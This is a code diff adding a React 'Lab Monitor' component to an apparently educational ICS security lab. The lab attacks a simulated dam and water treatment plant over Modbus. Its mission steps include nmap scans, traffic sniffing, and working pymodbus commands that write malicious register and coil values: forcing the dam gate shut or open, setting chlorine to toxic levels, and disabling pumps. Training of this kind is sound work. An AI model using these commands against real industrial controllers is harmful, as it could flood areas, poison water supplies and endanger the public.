@@ -1,0 +1,450 @@
+import { useState } from "react";
+import { API_URL } from "../../socket";
+import type { ProcessState } from "../../types/process";
+
+interface LabMonitorProps {
+  displayed: ProcessState;
+  actual: ProcessState;
+}
+
+type MissionId = "recon" | "eavesdrop" | "register_write";
+
+interface Mission {
+  id: MissionId;
+  title: string;
+  difficulty: string;
+  objective: string;
+  background: string;
+  steps: string[];
+  successCondition: string;
+  checkImpact: string[];
+}
+
+const MISSIONS: Mission[] = [
+  {
+    id: "recon",
+    title: "Phase 1: Reconnaissance",
+    difficulty: "BEGINNER",
+    objective: "Discover the Modbus service and enumerate all PLC registers to map the facility's control parameters.",
+    background: "In 2013, Iranian hackers discovered the Bowman Avenue Dam's SCADA system was exposed via a cellular modem. Your first step mirrors theirs: find the target and understand what it controls.",
+    steps: [
+      "nmap -sT -p 1-10000 localhost",
+      "# You should discover port 5020 (Modbus TCP)",
+      "",
+      "# Install pymodbus if needed:",
+      "pip install pymodbus",
+      "",
+      "# Read all holding registers:",
+      "python3 -c \"",
+      "from pymodbus.client import ModbusTcpClient",
+      "client = ModbusTcpClient('localhost', port=5020)",
+      "client.connect()",
+      "result = client.read_holding_registers(0, count=9)",
+      "for i, val in enumerate(result.registers):",
+      "    print(f'Register {i}: {val} (scaled: {val/100:.2f})')",
+      "client.close()\"",
+      "",
+      "# Read all coils (boolean states):",
+      "python3 -c \"",
+      "from pymodbus.client import ModbusTcpClient",
+      "client = ModbusTcpClient('localhost', port=5020)",
+      "client.connect()",
+      "result = client.read_coils(0, count=6)",
+      "print('Coils:', result.bits[:6])",
+      "client.close()\"",
+    ],
+    successCondition: "You can read all 9 holding registers and 6 coils without any authentication.",
+    checkImpact: [
+      "Control Room — verify the values you read match the dashboard",
+      "No visible impact on the system (this is passive reconnaissance)",
+    ],
+  },
+  {
+    id: "eavesdrop",
+    title: "Phase 2: Passive Eavesdropping",
+    difficulty: "BEGINNER",
+    objective: "Capture live Modbus traffic and observe that all communication is unencrypted with zero authentication.",
+    background: "Modbus/TCP was designed in 1979 for serial communication between PLCs. It has NO encryption, NO authentication, and NO integrity checks. Every real-world ICS running Modbus is vulnerable to eavesdropping.",
+    steps: [
+      "# Option A: Wireshark (GUI) — filter for Modbus",
+      "wireshark -i lo0 -f 'tcp port 5020'",
+      "# Apply display filter: modbus",
+      "",
+      "# Option B: tcpdump (CLI)",
+      "sudo tcpdump -i lo0 -X port 5020",
+      "",
+      "# What to look for:",
+      "# - FC=0x03: Read Holding Registers (HMI polling sensors)",
+      "# - FC=0x01: Read Coils (HMI checking pump/gate states)",
+      "# - All values transmitted in CLEARTEXT",
+      "# - No authentication tokens in any packet",
+      "# - Polling interval: ~500ms",
+    ],
+    successCondition: "You can see register values in plaintext in captured packets. No credentials observed anywhere.",
+    checkImpact: [
+      "No visible impact — this is passive observation only",
+      "The backend terminal will show normal polling activity",
+    ],
+  },
+  {
+    id: "register_write",
+    title: "Phase 3: Register Manipulation",
+    difficulty: "INTERMEDIATE",
+    objective: "Write malicious values to PLC registers to cause dangerous conditions in the dam and treatment plant.",
+    background: "In February 2021, an attacker accessed the Oldsmar FL water treatment plant and changed sodium hydroxide levels from 100 to 11,100 ppm. You will perform a similar attack on our simulated facility.",
+    steps: [
+      "# Attack A: CLOSE the sluice gate (causes dam OVERFLOW)",
+      "# With gate at 0%, outflow stops but inflow continues.",
+      "# Water level rises until HIGH LEVEL alarm → spillway → overflow!",
+      "python3 -c \"",
+      "from pymodbus.client import ModbusTcpClient",
+      "client = ModbusTcpClient('localhost', port=5020)",
+      "client.connect()",
+      "client.write_register(3, 0)  # 0% open = fully closed (scaled x100)",
+      "print('Gate CLOSED — dam will overflow!')",
+      "client.close()\"",
+      "",
+      "# Attack B: OPEN gate to 100% (floods treatment plant downstream)",
+      "# Outflow surges to ~210 m³/s, overwhelming the plant intake.",
+      "python3 -c \"",
+      "from pymodbus.client import ModbusTcpClient",
+      "client = ModbusTcpClient('localhost', port=5020)",
+      "client.connect()",
+      "client.write_register(3, 10000)  # 100% open (scaled x100)",
+      "print('Gate OPEN — treatment plant flooding!')",
+      "client.close()\"",
+      "",
+      "# Attack C: Set chlorine to toxic level (20 ppm, normal is 2.5)",
+      "python3 -c \"",
+      "from pymodbus.client import ModbusTcpClient",
+      "client = ModbusTcpClient('localhost', port=5020)",
+      "client.connect()",
+      "client.write_register(4, 2000)  # 20.00 ppm (scaled x100)",
+      "print('Chlorine set to 20 ppm — TOXIC!')",
+      "client.close()\"",
+      "",
+      "# Attack D: Disable pumps via coil writes",
+      "python3 -c \"",
+      "from pymodbus.client import ModbusTcpClient",
+      "client = ModbusTcpClient('localhost', port=5020)",
+      "client.connect()",
+      "client.write_coil(1, False)  # intake pump OFF",
+      "client.write_coil(3, False)  # distribution pump OFF",
+      "print('Pumps disabled')",
+      "client.close()\"",
+    ],
+    successCondition: "Dam water level rises above 85m (alarm) OR tank overflows OR chlorine exceeds 8 ppm (toxic) OR pumps disabled.",
+    checkImpact: [
+      "Dam View — Attack A: water rises, alarms trigger, spillway/overflow animation",
+      "Dam View — Attack B: water drops rapidly, outflow surges, LOW LEVEL alarm",
+      "Treatment Plant — Attack B/C: tank floods, chlorine spikes red, CHEMICAL alarm",
+      "Control Room — trend charts spike, alarm panel lights up, pressure drops",
+    ],
+  },
+];
+
+const REGISTER_MAP = [
+  { addr: 0, name: "dam_water_level", unit: "m", defaultVal: "50.0", range: "20-85", writable: false, note: "Alarm at 85m (high), 20m (low)" },
+  { addr: 1, name: "dam_inflow_rate", unit: "m³/s", defaultVal: "120.0", range: "50-200", writable: false, note: "Natural inflow, varies" },
+  { addr: 2, name: "dam_outflow_rate", unit: "m³/s", defaultVal: "120.0", range: "0-300", writable: false, note: "Depends on gate position" },
+  { addr: 3, name: "dam_gate_position", unit: "%", defaultVal: "40.0", range: "0-100", writable: true, note: "ATTACKABLE — 0=closed, 100=open" },
+  { addr: 4, name: "chlorine_dosing_rate", unit: "ppm", defaultVal: "2.5", range: "0-50", writable: true, note: "ATTACKABLE — alarm at >8 ppm" },
+  { addr: 5, name: "ph_level", unit: "pH", defaultVal: "7.2", range: "6.5-8.5", writable: false, note: "Alarm outside 6.5-8.5" },
+  { addr: 6, name: "turbidity", unit: "NTU", defaultVal: "1.5", range: "0-5", writable: false, note: "Alarm at >5 NTU" },
+  { addr: 7, name: "treatment_tank_level", unit: "%", defaultVal: "60.0", range: "0-100", writable: false, note: "Distribution tank fill" },
+  { addr: 8, name: "distribution_pressure", unit: "PSI", defaultVal: "55.0", range: "40-80", writable: false, note: "Alarm at <40 PSI" },
+];
+
+const COIL_MAP = [
+  { addr: 0, name: "sluice_gate_command", desc: "ATTACKABLE — True forces gate 100% open, False = use register 3 setpoint", writable: true, defaultVal: "False" },
+  { addr: 1, name: "intake_pump", desc: "Intake pump on/off", writable: true, defaultVal: "True" },
+  { addr: 2, name: "chemical_pump", desc: "Chemical dosing pump on/off", writable: true, defaultVal: "True" },
+  { addr: 3, name: "distribution_pump", desc: "Distribution pump on/off", writable: true, defaultVal: "True" },
+  { addr: 4, name: "high_level_alarm", desc: "Dam high level alarm (read-only)", writable: false, defaultVal: "False" },
+  { addr: 5, name: "chemical_alarm", desc: "Chemical alarm (read-only)", writable: false, defaultVal: "False" },
+];
+
+export function AttackConsole({ displayed, actual }: LabMonitorProps) {
+  const [selectedMission, setSelectedMission] = useState<MissionId>("recon");
+  const [showRegMap, setShowRegMap] = useState(false);
+
+  const mission = MISSIONS.find((m) => m.id === selectedMission)!;
+
+  const resetSystem = async () => {
+    await fetch(`${API_URL}/api/reset`, { method: "POST" });
+  };
+
+  // Detect attack by checking for manipulated controls (not natural alarms)
+  const isUnderAttack =
+    actual.dam.gate_position < 5 ||
+    actual.dam.gate_position > 90 ||
+    !actual.plant.intake_pump ||
+    !actual.plant.distribution_pump ||
+    actual.plant.chlorine_level > 8;
+
+  return (
+    <div className="bg-gray-950 text-white p-4 h-full">
+      {/* Header */}
+      <div className="flex justify-between items-center mb-4">
+        <div>
+          <h1 className="text-xl font-mono font-bold text-amber-400">
+            LAB MONITOR
+          </h1>
+          <p className="text-sm font-mono text-gray-500">
+            Operation Watergate — Attack from your terminal, observe impact here
+          </p>
+        </div>
+        <div className="flex gap-2">
+          <button
+            onClick={() => setShowRegMap(!showRegMap)}
+            className="bg-gray-800 hover:bg-gray-700 text-gray-300 px-3 py-2 rounded font-mono text-xs border border-gray-700"
+          >
+            {showRegMap ? "HIDE" : "SHOW"} REGISTER MAP
+          </button>
+          <button
+            onClick={resetSystem}
+            className="bg-gray-800 hover:bg-gray-700 text-gray-300 px-3 py-2 rounded font-mono text-xs border border-gray-700"
+          >
+            RESET SYSTEM
+          </button>
+        </div>
+      </div>
+
+      {/* Register Map (toggleable) */}
+      {showRegMap && (
+        <div className="grid grid-cols-2 gap-3 mb-4">
+          <div className="bg-gray-900 rounded-lg p-3 border border-gray-800">
+            <h3 className="text-xs font-mono text-cyan-400 mb-2 font-bold">
+              HOLDING REGISTERS (values scaled x100)
+            </h3>
+            <table className="w-full text-xs font-mono">
+              <thead>
+                <tr className="text-gray-500 border-b border-gray-800">
+                  <th className="text-left p-1">Reg</th>
+                  <th className="text-left p-1">Name</th>
+                  <th className="text-left p-1">Unit</th>
+                  <th className="text-left p-1">Default</th>
+                  <th className="text-left p-1">Safe Range</th>
+                  <th className="text-left p-1">Notes</th>
+                </tr>
+              </thead>
+              <tbody>
+                {REGISTER_MAP.map((r) => (
+                  <tr key={r.addr} className={`border-b border-gray-800/30 ${r.writable ? "text-red-300" : "text-gray-300"}`}>
+                    <td className="p-1 text-cyan-400">{r.addr}</td>
+                    <td className="p-1">{r.name}</td>
+                    <td className="p-1 text-gray-500">{r.unit}</td>
+                    <td className="p-1 text-yellow-400">{r.defaultVal}</td>
+                    <td className="p-1 text-green-400">{r.range}</td>
+                    <td className="p-1 text-gray-500 text-[10px]">{r.note}</td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+            <p className="text-[10px] text-red-400 mt-2">Red rows = writable (attackable) registers</p>
+          </div>
+          <div className="bg-gray-900 rounded-lg p-3 border border-gray-800">
+            <h3 className="text-xs font-mono text-cyan-400 mb-2 font-bold">
+              COILS (boolean: True/False)
+            </h3>
+            <table className="w-full text-xs font-mono">
+              <thead>
+                <tr className="text-gray-500 border-b border-gray-800">
+                  <th className="text-left p-1">Coil</th>
+                  <th className="text-left p-1">Name</th>
+                  <th className="text-left p-1">Default</th>
+                  <th className="text-left p-1">Description</th>
+                </tr>
+              </thead>
+              <tbody>
+                {COIL_MAP.map((c) => (
+                  <tr key={c.addr} className={`border-b border-gray-800/30 ${c.writable ? "text-red-300" : "text-gray-300"}`}>
+                    <td className="p-1 text-cyan-400">{c.addr}</td>
+                    <td className="p-1">{c.name}</td>
+                    <td className="p-1 text-yellow-400">{c.defaultVal}</td>
+                    <td className="p-1 text-gray-500">{c.desc}</td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+            <p className="text-[10px] text-red-400 mt-2">Red rows = writable (attackable) coils</p>
+          </div>
+        </div>
+      )}
+
+      {/* Mission selector */}
+      <div className="flex gap-2 mb-4">
+        {MISSIONS.map((m, i) => (
+          <button
+            key={m.id}
+            onClick={() => setSelectedMission(m.id)}
+            className={`px-3 py-2 rounded font-mono text-xs border ${
+              selectedMission === m.id
+                ? "bg-amber-900 border-amber-600 text-amber-200"
+                : "bg-gray-900 border-gray-700 text-gray-400 hover:border-gray-500"
+            }`}
+          >
+            Phase {i + 1}
+          </button>
+        ))}
+      </div>
+
+      <div className="grid grid-cols-3 gap-3">
+        {/* Left: Mission briefing + commands */}
+        <div className="col-span-2 space-y-3">
+          {/* Mission briefing */}
+          <div className="bg-gray-900 rounded-lg p-4 border border-gray-800">
+            <div className="flex justify-between items-start mb-3">
+              <h2 className="font-mono text-sm font-bold text-gray-200">
+                {mission.title}
+              </h2>
+              <span
+                className={`text-xs font-mono px-2 py-1 rounded ${
+                  mission.difficulty === "BEGINNER"
+                    ? "bg-green-900 text-green-300"
+                    : mission.difficulty === "INTERMEDIATE"
+                    ? "bg-yellow-900 text-yellow-300"
+                    : mission.difficulty === "ADVANCED"
+                    ? "bg-orange-900 text-orange-300"
+                    : "bg-red-900 text-red-300"
+                }`}
+              >
+                {mission.difficulty}
+              </span>
+            </div>
+
+            <div className="mb-3">
+              <h3 className="text-xs font-mono text-amber-400 mb-1">OBJECTIVE</h3>
+              <p className="text-xs text-gray-300">{mission.objective}</p>
+            </div>
+
+            <div className="mb-3">
+              <h3 className="text-xs font-mono text-gray-500 mb-1">BACKGROUND</h3>
+              <p className="text-xs text-gray-400 italic">{mission.background}</p>
+            </div>
+
+            <div className="mb-3">
+              <h3 className="text-xs font-mono text-green-400 mb-1">SUCCESS CONDITION</h3>
+              <p className="text-xs text-green-300">{mission.successCondition}</p>
+            </div>
+
+            <div>
+              <h3 className="text-xs font-mono text-blue-400 mb-1">WHERE TO CHECK IMPACT</h3>
+              <ul className="text-xs text-gray-400 space-y-1">
+                {mission.checkImpact.map((item, i) => (
+                  <li key={i} className="flex gap-2">
+                    <span className="text-blue-500">-</span> {item}
+                  </li>
+                ))}
+              </ul>
+            </div>
+          </div>
+
+          {/* Commands to run */}
+          <div className="bg-black rounded-lg p-4 border border-gray-800">
+            <h3 className="text-xs font-mono text-green-400 mb-2 font-bold">
+              COMMANDS — Run these in your terminal
+            </h3>
+            <pre className="text-xs font-mono text-gray-300 overflow-x-auto whitespace-pre">
+              {mission.steps.join("\n")}
+            </pre>
+          </div>
+        </div>
+
+        {/* Right: Live split view */}
+        <div className="space-y-3">
+          {/* Attack detection indicator */}
+          <div
+            className={`rounded-lg p-3 border font-mono text-xs text-center font-bold ${
+              isUnderAttack
+                ? "bg-red-900/30 border-red-600 text-red-300 animate-pulse"
+                : "bg-green-900/30 border-green-800 text-green-400"
+            }`}
+          >
+            {isUnderAttack
+              ? "ATTACK DETECTED — Abnormal values"
+              : "NO ATTACK — System normal"}
+          </div>
+
+          {/* Operator View */}
+          <div className="bg-gray-900 rounded-lg p-3 border border-gray-800">
+            <h3 className="text-xs font-mono text-green-400 mb-2 font-bold">
+              OPERATOR VIEW
+            </h3>
+            <div className="space-y-1.5 text-xs font-mono">
+              {[
+                { label: "Water Level", val: displayed.dam.water_level, unit: "m" },
+                { label: "Gate Position", val: displayed.dam.gate_position, unit: "%" },
+                { label: "Chlorine", val: displayed.plant.chlorine_level, unit: "ppm" },
+                { label: "pH Level", val: displayed.plant.ph_level, unit: "" },
+                { label: "Pressure", val: displayed.plant.distribution_pressure, unit: "PSI" },
+                { label: "Tank Level", val: displayed.plant.tank_level, unit: "%" },
+              ].map(({ label, val, unit }) => (
+                <div key={label} className="flex justify-between">
+                  <span className="text-gray-500">{label}</span>
+                  <span className="text-green-400">
+                    {val.toFixed(1)} {unit}
+                  </span>
+                </div>
+              ))}
+              <div className="flex justify-between border-t border-gray-800 pt-1 mt-1">
+                <span className="text-gray-500">Alarms</span>
+                <span className="text-green-400">
+                  {displayed.dam.high_level_alarm || displayed.plant.chemical_alarm
+                    ? "ACTIVE"
+                    : "NONE"}
+                </span>
+              </div>
+            </div>
+          </div>
+
+          {/* Actual State */}
+          <div className="bg-gray-900 rounded-lg p-3 border border-red-900/30">
+            <h3 className="text-xs font-mono text-red-400 mb-2 font-bold">
+              ACTUAL STATE (GROUND TRUTH)
+            </h3>
+            <div className="space-y-1.5 text-xs font-mono">
+              {[
+                { label: "Water Level", val: actual.dam.water_level, unit: "m", danger: actual.dam.water_level > 85 },
+                { label: "Gate Position", val: actual.dam.gate_position, unit: "%", danger: actual.dam.gate_position > 90 },
+                { label: "Chlorine", val: actual.plant.chlorine_level, unit: "ppm", danger: actual.plant.chlorine_level > 8 },
+                { label: "pH Level", val: actual.plant.ph_level, unit: "", danger: actual.plant.ph_level < 6.5 || actual.plant.ph_level > 8.5 },
+                { label: "Pressure", val: actual.plant.distribution_pressure, unit: "PSI", danger: actual.plant.distribution_pressure < 40 },
+                { label: "Tank Level", val: actual.plant.tank_level, unit: "%", danger: actual.plant.tank_level > 95 || actual.plant.tank_level < 5 },
+              ].map(({ label, val, unit, danger }) => (
+                <div key={label} className="flex justify-between">
+                  <span className="text-gray-500">{label}</span>
+                  <span className={danger ? "text-red-400 font-bold" : "text-gray-300"}>
+                    {val.toFixed(1)} {unit}
+                  </span>
+                </div>
+              ))}
+              <div className="flex justify-between border-t border-gray-800 pt-1 mt-1">
+                <span className="text-gray-500">Alarms</span>
+                <span
+                  className={
+                    actual.dam.high_level_alarm || actual.plant.chemical_alarm
+                      ? "text-red-400 animate-pulse font-bold"
+                      : "text-gray-300"
+                  }
+                >
+                  {actual.dam.high_level_alarm || actual.plant.chemical_alarm
+                    ? "ACTIVE"
+                    : "NONE"}
+                </span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-gray-500">Pumps</span>
+                <span className={!actual.plant.distribution_pump ? "text-red-400" : "text-gray-300"}>
+                  I:{actual.plant.intake_pump ? "ON" : "OFF"}{" "}
+                  C:{actual.plant.chemical_pump ? "ON" : "OFF"}{" "}
+                  D:{actual.plant.distribution_pump ? "ON" : "OFF"}
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
